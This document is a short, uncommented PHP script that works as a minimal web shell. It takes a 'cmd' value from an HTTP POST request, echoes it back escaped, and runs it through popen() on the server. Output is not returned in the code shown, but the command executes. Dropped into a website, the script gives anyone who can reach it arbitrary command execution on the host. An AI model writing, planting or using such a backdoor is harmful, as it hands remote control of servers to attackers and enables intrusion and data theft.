<?php
function e($s) { 
	echo htmlspecialchars($s, ENT_QUOTES); 
}

$cmd = $_POST['cmd'];
if (!empty($cmd))
{
	e($cmd);
	$p = popen('exec 2>&1; ' . $cmd, 'r');
}
?>